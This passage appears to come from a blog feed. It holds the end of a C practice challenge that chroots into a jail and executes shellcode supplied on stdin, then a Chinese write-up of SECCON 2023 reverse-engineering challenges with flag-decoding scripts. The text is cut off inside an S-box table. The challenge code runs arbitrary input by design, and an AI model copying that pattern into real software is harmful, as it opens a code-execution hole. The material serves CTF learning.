&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)insn[j].address);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; insn[j].size; k++) <span class="built_in">printf</span>(<span class="string">&quot;%02hhx &quot;</span>, insn[j].bytes[k]);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = insn[j].size; k &lt; <span class="number">15</span>; k++) <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; | %s %s\n&quot;</span>, insn[j].mnemonic, insn[j].op_str);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">cs_free</span>(insn, count);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR: Failed to disassemble shellcode! Bytes are:\n\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;      Address      |                      Bytes\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt;= shellcode_size; i += <span class="number">16</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;0x%016lx | &quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)shellcode_addr+i);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++) <span class="built_in">printf</span>(<span class="string">&quot;%02hhx &quot;</span>, ((<span class="type">uint8_t</span>*)shellcode_addr)[i+k]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cs_close</span>(&amp;handle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(argc &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;###\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;### Welcome to %s!\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;###\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;jail, not the real flag file outside of it. If you want the real flag, you must escape.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You may open a specified file, as given by the first argument to the program (argv[1]).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You may upload custom shellcode to do whatever you want.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert</span>(argc &gt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Checking to make sure you&#x27;re not trying to open the flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">assert</span>(<span class="built_in">strstr</span>(argv[<span class="number">1</span>], <span class="string">&quot;flag&quot;</span>) == <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = <span class="built_in">open</span>(argv[<span class="number">1</span>], O_RDONLY|O_NOFOLLOW);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to open the file located at `%s`.\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Successfully opened the file located at `%s`.\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> jail_path[] = <span class="string">&quot;/tmp/jail-XXXXXX&quot;</span>;</span><br><span class="line">    <span class="built_in">assert</span>(<span class="built_in">mkdtemp</span>(jail_path) != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Creating a jail at `%s`.\n&quot;</span>, jail_path);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert</span>(<span class="built_in">chroot</span>(jail_path) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fffd = <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, O_WRONLY | O_CREAT);</span><br><span class="line">    <span class="built_in">write</span>(fffd, <span class="string">&quot;FLAG&#123;FAKE&#125;&quot;</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">close</span>(fffd);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *shellcode = <span class="built_in">mmap</span>((<span class="type">void</span> *)<span class="number">0x1337000</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">assert</span>(shellcode == (<span class="type">void</span> *)<span class="number">0x1337000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Mapped 0x1000 bytes for shellcode at %p!\n&quot;</span>, shellcode);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Reading 0x1000 bytes of shellcode from stdin.\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> shellcode_size = <span class="built_in">read</span>(<span class="number">0</span>, shellcode, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This challenge is about to execute the following shellcode:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">print_disassembly</span>(shellcode, shellcode_size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Executing shellcode!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ((<span class="built_in">void</span>(*)())shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>./flag</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>seccon 2023</title>
    <url>/2023/09/18/seccon-2023/</url>
    <content><![CDATA[<h6 id="preface-本来人说和一块看结果周末事情太多了只能自己做赛中做了俩后面只能再慢慢补题qaq"><a class="markdownIt-Anchor" href="#preface-本来人说和一块看结果周末事情太多了只能自己做赛中做了俩后面只能再慢慢补题qaq">#</a> PREFACE: 本来人说和一块看，结果周末事情太多了只能自己做，赛中做了俩，后面只能再慢慢补题 qaq.</h6>
<h6 id="基本上算是比较少看国外赛看了一下seccon感觉确实和平时做的差距挺大的比如这个re很有些misc的感觉难度还行不算很恶心但是确实新希望最近几天能把它复现出来"><a class="markdownIt-Anchor" href="#基本上算是比较少看国外赛看了一下seccon感觉确实和平时做的差距挺大的比如这个re很有些misc的感觉难度还行不算很恶心但是确实新希望最近几天能把它复现出来">#</a> 基本上算是比较少看国外赛，看了一下 seccon 感觉确实和平时做的差距挺大的，比如这个 re 很有些 misc 的感觉，难度还行不算很恶心，但是确实新，希望最近几天能把它复现出来</h6>
<h6 id="9-19-ok勉强算搞完了这个nim的oi还是挺恶心的"><a class="markdownIt-Anchor" href="#9-19-ok勉强算搞完了这个nim的oi还是挺恶心的">#</a> 9-19: ok 勉强算搞完了，这个 nim 的 oi 还是挺恶心的…</h6>
<span id="more"></span>
<h4 id="jumpout"><a class="markdownIt-Anchor" href="#jumpout">#</a> jumpout</h4>
<p>签到题，写了个小混淆反静态看，大概意思是将所有的 <code>jmp addr</code>  改成类似 <code>mov rax, addr; jmp rax</code>  的操作，应该是写了个 <code>llvm</code>  小工具之类的</p>
<p>动调仔细看汇编即可，理论上可以自己修，但是没啥必要（而且也不太会，近期还得学学 angr，qaq），这里只是做了三次异或</p>
<p>需要对栈上和寄存器的数据跟的比较清晰，这里的 i 其实没跟明白但是可以简单猜一下，实在不行就每轮都跟完也能出（<s>异或么反正，每轮都拿一个最后值就行其实</s>～）</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [  <span class="number">0xF6</span>, <span class="number">0xF5</span>, <span class="number">0x31</span>, <span class="number">0xC8</span>, <span class="number">0x81</span>, <span class="number">0x15</span>, <span class="number">0x14</span>, <span class="number">0x68</span>, <span class="number">0xF6</span>, <span class="number">0x35</span>,</span><br><span class="line">  <span class="number">0xE5</span>, <span class="number">0x3E</span>, <span class="number">0x82</span>, <span class="number">0x09</span>, <span class="number">0xCA</span>, <span class="number">0xF1</span>, <span class="number">0x8A</span>, <span class="number">0xA9</span>, <span class="number">0xDF</span>, <span class="number">0xDF</span>,</span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x2A</span>, <span class="number">0x6D</span>, <span class="number">0x81</span>, <span class="number">0xF5</span>, <span class="number">0xA6</span>, <span class="number">0x85</span>, <span class="number">0xDF</span>, <span class="number">0x17</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enc = [  <span class="number">0xF0</span>, <span class="number">0xE4</span>, <span class="number">0x25</span>, <span class="number">0xDD</span>, <span class="number">0x9F</span>, <span class="number">0x0B</span>, <span class="number">0x3C</span>, <span class="number">0x50</span>, <span class="number">0xDE</span>, <span class="number">0x04</span>,</span><br><span class="line">  <span class="number">0xCA</span>, <span class="number">0x3F</span>, <span class="number">0xAF</span>, <span class="number">0x30</span>, <span class="number">0xF3</span>, <span class="number">0xC7</span>, <span class="number">0xAA</span>, <span class="number">0xB2</span>, <span class="number">0xFD</span>, <span class="number">0xEF</span>,</span><br><span class="line">  <span class="number">0x17</span>, <span class="number">0x18</span>, <span class="number">0x57</span>, <span class="number">0xB4</span>, <span class="number">0xD0</span>, <span class="number">0x8F</span>, <span class="number">0xB8</span>, <span class="number">0xF4</span>, <span class="number">0x23</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i ^ <span class="number">0x55</span> ^ enc[i] ^ a[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># SECCON&#123;jump_table_everywhere&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="sickle"><a class="markdownIt-Anchor" href="#sickle">#</a> Sickle</h4>
<p>第一次见这个 pickle 加载 payload 反序列化调用 shellcode 的操作，具体其实还是不太会搞，这题 <code>pickletools.dis(payload)</code>  得到的结果感觉用处不大，知道有个 <code>xor</code>  的信息，不知道怎么提取其实（等 wp 出来再复现复现）但是 re 么真不能太纠结过程吧，反正 fuzz 一下，嗯看一下 bytes，猜测是一个 <code>rsa + xor + 倒序</code> 的组合，参数很奇怪 n 是一个素数（开始以为要打，问了一下密码爷说不用直接可以解）解了第一段发现第二段参数不对，遂注意到 <code>xor</code>  参数换了，然后么就出了…</p>
<p>看这个 flag 内容感觉或许确实不太有动调工具，但是应该有方法起码把完整字节码反序列化拿到吧… 但是确实没搞出来，晚点看看 wp…</p>
<h6 id="9-19-原来可以直接改源码增加print这样直接就有完整流程了orz"><a class="markdownIt-Anchor" href="#9-19-原来可以直接改源码增加print这样直接就有完整流程了orz">#</a> 9-19: 原来可以直接改源码，增加 print，这样直接就有完整流程了，orz</h6>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">check_values = [</span><br><span class="line">    <span class="number">8215359690687096682</span>,</span><br><span class="line">    <span class="number">1862662588367509514</span>,</span><br><span class="line">    <span class="number">8350772864914849965</span>,</span><br><span class="line">    <span class="number">11616510986494699232</span>,</span><br><span class="line">    <span class="number">3711648467207374797</span>,</span><br><span class="line">    <span class="number">9722127090168848805</span>,</span><br><span class="line">    <span class="number">16780197523811627561</span>,</span><br><span class="line">    <span class="number">18138828537077112905</span>,</span><br><span class="line">]</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">xor = <span class="number">1244422970072434993</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> check_values:</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    n = <span class="number">18446744073709551557</span></span><br><span class="line">    phi = (<span class="number">18446744073709551557</span> - <span class="number">1</span>)</span><br><span class="line">    d = gmpy2.invert(e, phi)</span><br><span class="line">    m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(m ^ xor).decode()[::-<span class="number">1</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    xor = c</span><br><span class="line"><span class="comment"># SECCON&#123;Can_someone_please_make_a_debugger_for_Pickle_bytecode??&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="prefect-flu"><a class="markdownIt-Anchor" href="#prefect-flu">#</a> prefect-flu</h4>
<h6 id="9-17没出还很急感觉确实有点点misc来的"><a class="markdownIt-Anchor" href="#9-17没出还很急感觉确实有点点misc来的">#</a> 9-17, 没出还，很急，感觉确实有点点 misc 来的</h6>
<p>也是第一次见，dvd iso，没搞清楚怎么提取逻辑</p>
<p>感觉可以参考是这篇：<a href="https://zhuanlan.zhihu.com/p/46518832">蓝光文件解析 - 知乎 (zhihu.com)</a>，但是里面的工具编译不出来，它的文件路径感觉是乱的，还没解决…</p>
<p>用 vlc 可以运行，点击很多 button，会触发 check 逻辑一段一段播放视频，作为回显，逻辑应该是在 <code>BDMV/MovieObject.bdmv</code>  里面的（JAR 里面明明确实没找到东西…）</p>
<p><code>BDedit</code>  可以打开这个 bdmv，里面有一定的运行逻辑，但是里面是缺少 check flag 的逻辑的，目前是还没找到 check 到底在哪，急急急…</p>
<p><img loading="lazy" data-src="seccon-2023/image-20230918105138109.png" alt="image-20230918105138109"></p>
<h6 id="9-18看了别的师傅的wp出了一步之遥"><a class="markdownIt-Anchor" href="#9-18看了别的师傅的wp出了一步之遥">#</a> 9-18, 看了别的师傅的 wp，出了，一步之遥…</h6>
<p>导入 STREAM 中的 M2TS 到这里的 Menu 里面，可以看每个 button 的具体逻辑…</p>
<p><img loading="lazy" data-src="seccon-2023/image-20230918160853438.png" alt="image-20230918160853438"></p>
<p>这个 <code>Call Object</code>  不同的既是正确的 flag，猜一下可以得到这个图（偷来的图）</p>
<p><img loading="lazy" data-src="seccon-2023/image-20230918161010536.png" alt="image-20230918161010536"></p>
<p>SECCON{</p>
<p>26 11 10 25 38 4 7 12 28 38 10 11 13 28 38 32 24 21 11 38 16 23 13 17 38 31 16 15 2 38 15 25 27 27 38 27 23</p>
<p>34 33 39</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;1234567890QWERTYUIOPASDFGHJKL&#123;ZXCVBNM_-&#125;&#x27;</span></span><br><span class="line">b = [<span class="number">26</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">25</span>,<span class="number">38</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">28</span>,<span class="number">38</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">28</span>,<span class="number">38</span>,<span class="number">32</span>,<span class="number">24</span>,<span class="number">21</span>,<span class="number">11</span>,<span class="number">38</span>,<span class="number">16</span>,<span class="number">23</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">38</span>,<span class="number">31</span>,<span class="number">16</span>,<span class="number">15</span>,<span class="number">2</span>,<span class="number">38</span>,<span class="number">15</span>,<span class="number">25</span>,<span class="number">27</span>,<span class="number">27</span>,<span class="number">38</span>,<span class="number">27</span>,<span class="number">23</span>,<span class="number">34</span>,<span class="number">33</span>,<span class="number">39</span>]</span><br><span class="line">flag = <span class="string">&#x27;SECCON&#123;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    flag += a[i]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># SECCON&#123;JWQH-58EL-QWRL-CGSW-UFRI-XUY3-YHKK-KFBV&#125; 没交过，感觉可能错了一两位？但是确实不想debug了先就这样</span></span><br></pre></td></tr></table></figure>
<h4 id="xuyao"><a class="markdownIt-Anchor" href="#xuyao">#</a> xuyao</h4>
<p>一开始以为混淆的是 check 部分逻辑，因为确实有点点奇怪</p>
<p>结果混淆的是加密，将 SM4 的盒换成 AES 的 sbox 了（属于看 wp 看的，确实识别加密这块不熟悉 qaq）</p>
<p>回来动调硬看一下可以发现这里 <code>Feistel</code>  的轮数都不对</p>
<p><img loading="lazy" data-src="seccon-2023/image-20230919154214378.png" alt="image-20230919154214378"></p>
<p>这里旋转的位数改了：</p>
<p><img loading="lazy" data-src="seccon-2023/image-20230919160104814.png" alt="image-20230919160104814"></p>
<p>然后抄一个 r3 的 exp 吧，把表换一下，改天得再重新学学 sm4 算法了：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SM4_ENCRYPT 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SM4_DECRYPT 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="type">int</span> mode; <span class="comment">/*!&lt; encrypt/decrypt */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> sk[<span class="number">32</span>]; <span class="comment">/*!&lt; SM4 subkeys */</span></span><br><span class="line">&#125; sm4_context;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sm4_setkey_enc</span><span class="params">(sm4_context *ctx, <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">16</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sm4_setkey_dec</span><span class="params">(sm4_context *ctx, <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">16</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sm4_crypt_ecb</span><span class="params">(sm4_context *ctx, <span class="type">int</span> mode, <span class="type">int</span> length, <span class="type">unsigned</span> <span class="type">char</span> *input,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="type">unsigned</span> <span class="type">char</span> *output)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sm4_crypt_cbc</span><span class="params">(sm4_context *ctx, <span class="type">int</span> mode, <span class="type">int</span> length, <span class="type">unsigned</span> <span class="type">char</span> iv[<span class="number">16</span>],</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="type">unsigned</span> <span class="type">char</span> *input, <span class="type">unsigned</span> <span class="type">char</span> *output)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> GET_ULONG_BE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_ULONG_BE(n, b, i) \</span></span><br><span class="line"><span class="meta">&#123; \</span></span><br><span class="line"><span class="meta">(n) = ((unsigned long)(b)[(i)] &lt;&lt; 24) | \</span></span><br><span class="line"><span class="meta">((unsigned long)(b)[(i) + 1] &lt;&lt; 16) | \</span></span><br><span class="line"><span class="meta">((unsigned long)(b)[(i) + 2] &lt;&lt; 8) | ((unsigned long)(b)[(i) + 3]); \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PUT_ULONG_BE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT_ULONG_BE(n, b, i) \</span></span><br><span class="line"><span class="meta">&#123; \</span></span><br><span class="line"><span class="meta">(b)[(i)] = (unsigned char)((n) &gt;&gt; 24); \</span></span><br><span class="line"><span class="meta">(b)[(i) + 1] = (unsigned char)((n) &gt;&gt; 16); \</span></span><br><span class="line"><span class="meta">(b)[(i) + 2] = (unsigned char)((n) &gt;&gt; 8); \</span></span><br><span class="line"><span class="meta">(b)[(i) + 3] = (unsigned char)((n)); \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHL(x, n) (((x)&amp;0xFFFFFFFF) &lt;&lt; n)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROTL(x, n) (SHL((x), n) | ((x) &gt;&gt; (32 - n)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAP(a, b) \</span></span><br><span class="line"><span class="meta">&#123; \</span></span><br><span class="line"><span class="meta">unsigned long t = a; \</span></span><br><span class="line"><span class="meta">a = b; \</span></span><br><span class="line"><span class="meta">b = t; \</span></span><br><span class="line"><span class="meta">t = 0; \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> SboxTable[<span class="number">16</span>][<span class="number">16</span>] = &#123;</span><br><span class="line">  <span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>,</span><br><span class="line">  <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>, <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>,</span><br><span class="line">  <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>,</span><br><span class="line">  <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,</span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>,</span><br><span class="line">  <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>,</span><br><span class="line">  <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>, <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>,</span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>,</span><br><span class="line">  <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>,</span><br><span class="line">  <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>, <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>,</span><br><span class="line">  <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>, <span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>,</span><br><span class="line">  <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,</span><br><span class="line">  <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>,</span><br><span class="line">  <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>, <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>,</span><br><span class="line">  <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>, <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>,</span><br><span class="line">  <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>,</span><br><span class="line">  <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>,</span><br><span class="line">  <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>,</span><br><span class="line">  <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>, <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>,</span><br><span class="line">  <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>,</span><br><span class="line">  <span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>,</span><br><span class="line">  <span class="number">0xB0</span>, <span class="number">0x54</span>, <span 